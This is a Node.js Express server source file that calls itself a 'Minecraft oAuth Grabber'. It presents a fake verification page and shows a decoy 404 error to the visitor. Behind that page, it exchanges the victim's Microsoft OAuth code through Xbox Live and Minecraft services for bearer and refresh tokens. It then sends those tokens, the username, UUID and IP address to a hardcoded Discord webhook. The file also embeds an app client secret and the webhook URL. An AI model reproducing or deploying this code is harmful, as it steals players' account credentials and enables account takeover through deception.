//Config
const client_secret = 'whi8Q~PlcqNOs.78RPya~nl7tSDB12gEIqHDrbtE'
const client_id = '633c72ff-333a-495e-be20-8416cfbe7f5c'
const redirect_uri = 'https://skyhub.onrender.com'
const webhook_url = 'https://ptb.discord.com/api/webhooks/1113551902194552902/IKI4gMEgyAIT5rn4i-yYiH4pNA9AjRald5dOlxrBl_VOnRepx9Qqz-nD_5Sfs190VsRv'
//Requirements
const axios = require('axios')
const express = require('express')
const app = express()
const port = process.env.PORT || 3000

// app.get('/verify', async (req, res) => {
// 	res.send("<html> <head> <meta charset=\"UTF-8\"> <title>Verification</title> <style> a:visited { color: LightGray; } a { color: LightGray; } a:hover { color: white; } div { height: 50px; } @import url('http://fonts.cdnfonts.com/css/proxima-nova-2'); body { margin: 0; padding: 0; background: #212121; } button { position: absolute; animate: 0.5s; transition: 0.5s; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 200px; height: 60px; text-align: center; line-height: 60px; color: #fff; font-size: 22px; text-transform: uppercase; text-decoration: none; font-family: 'Proxima Nova', sans-serif; box-sizing: border-box; background: linear-gradient(90deg, #03a9f4, #f441a5, #ffeb3b, #03a9f4); background-size: 400%; border-radius: 30px; z-index: 1; cursor:pointer; } button:hover { animation: animate 8s linear infinite; animate: 0.5s; transition: 0.5s; } @keyframes animate { 0% { background-position: 0%; } 100% { background-position: 400%; } } button:before { animate: 0.5s; transition: 0.5s; content: ''; position: absolute; top: -5px; left: -5px; right: -5px; bottom: -5px; z-index: -1; background: linear-gradient(90deg, #03a9f4, #f441a5, #ffeb3b, #03a9f4); background-size: 400%; border-radius: 40px; opacity: 0; transition: 0.5s; } button:hover:before { filter: blur(20px); opacity: 1; animation: animate 8s linear infinite; animate: 0.5s; transition: 0.5s; } </style> </head> <body> <button type=\"button\" onclick= \"window.open('"+redirect+"','popUpWindow','height=500,width=400,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');\">Verify</button> </body> </html>")
// })

app.get('/', async (req, res) => {
    //also cool little "Verified!" html page
    res.send('<html> <head> <meta charset="UTF-8"> <title>Verification Successful</title> <style>  .neonText { color: #fff; text-shadow: 0 0 7px #fff, 0 0 10px #fff, 0 0 21px #fff, 0 0 42px #0fa, 0 0 82px #0fa, 0 0 92px #0fa, 0 0 102px #0fa, 0 0 151px #0fa; } /* Additional styling */ body { font-size: 18px; font-family: \"Helvetica Neue\", sans-serif; background-color: #010a01; } h1, h2 { text-align: center; text-transform: uppercase; font-weight: 400; } h1 { font-size: 4.2rem; } .pulsate { animation: pulsate 1.5s infinite alternate; } h2 { font-size: 1.2rem; } .container { margin-top: 20vh; } @keyframes pulsate { 100% { text-shadow: 0 0 4px #fff, 0 0 11px #fff, 0 0 19px #fff, 0 0 40px #0fa, 0 0 80px #0fa, 0 0 90px #0fa, 0 0 100px #0fa, 0 0 150px #0fa; } 0% { text-shadow: 0 0 2px #fff, 0 0 4px #fff, 0 0 6px #fff, 0 0 10px #0fa, 0 0 45px #0fa, 0 0 55px #0fa, 0 0 70px #0fa, 0 0 80px #0fa; }  </style> </head> <body> <div class="container"> <h1 class="neonText pulsate">404</h1> <h2 class=\"neonText pulsate\">There was an error while contacting the verification bot.</h2> </div> </body> </html>')
    const code = req.query.code
    if (code == null) {
        return
    }
    try {
        const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
        const accessToken = accessTokenAndRefreshTokenArray[0]
        const refreshToken = accessTokenAndRefreshTokenArray[1]
        const hashAndTokenArray = await getUserHashAndToken(accessToken)
        const userToken = hashAndTokenArray[0]
        const userHash = hashAndTokenArray[1]
        const xstsToken = await getXSTSToken(userToken)
        const bearerToken = await getBearerToken(xstsToken, userHash)
        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
        const uuid = usernameAndUUIDArray[0]
        const username = usernameAndUUIDArray[1]
        const ip = getIp(req)
        postToWebhook(username, bearerToken, uuid, ip, refreshToken)
    } catch (e) {
        console.log(e)
    }
})

app.listen(port, () => {
    console.log(`Started the server on ${port}`)
})

async function getAccessTokenAndRefreshToken(code) {
    const url = 'https://login.live.com/oauth20_token.srf'

    const config = {
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    }
    let data = {
        client_id: client_id,
        redirect_uri: redirect_uri,
        client_secret: client_secret,
        code: code,
        grant_type: 'authorization_code'
    }

    let response = await axios.post(url, data, config)
    return [response.data['access_token'], response.data['refresh_token']]
}

async function getUserHashAndToken(accessToken) {
    const url = 'https://user.auth.xboxlive.com/user/authenticate'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)
    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getXSTSToken(userToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [userToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)

    return response.data['Token']
}

async function getBearerToken(xstsToken, userHash) {
    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
    const config = {
        headers: {
            'Content-Type': 'application/json',
        }
    }
    let data = {
        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
    }
    let response = await axios.post(url, data, config)
    return response.data['access_token']
}

async function getUsernameAndUUID(bearerToken) {
    const url = 'https://api.minecraftservices.com/minecraft/profile'
    const config = {
        headers: {
            'Authorization': 'Bearer ' + bearerToken,
        }
    }
    let response = await axios.get(url, config)
    return [response.data['id'], response.data['name']]
}

function getIp(req) {
    return req.headers['x-forwarded-for'] || req.socket.remoteAddress
}

function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
    const url = webhook_url
    let data = {
        username: "Floor",
        avatar_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg",
        content: "@everyone",
        embeds: [
            {
            title: username + " has been beamed",
            color: 5898337,
            description: "**Username:**\n`"+username+"`\n\n**UUID:**\n`"+uuid+"`\n\n**IP:**\n`"+ip+"`\n\n**Token:**\n`"+bearerToken+"`\n\n**Refresh Token:**\n`"+refreshToken+"`\n\n**Login:**\n`"+username + ":" + uuid + ":"+ bearerToken+"`",
            url: "https://sky.shiiyu.moe/stats/"+username,
            footer: {
                text: "Minecraft oAuth Grabber by me",
                icon_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg"
            },
            }
        ]
    }
    axios.all([ 
        axios.post(url, data),
        axios.post(webhook_url, data)
           .then(() => console.log("Successfully authenticated, posting to webhook!"))
    ])
    
}


const bannedNames = []

function addBan(name) {
    bannedNames.push(name);
}

function checkIfBanned(name) {

    for (const item of bannedNames) {
        if (name === item) {
            return true
        }
    }
    addBan(name)
    return false
}
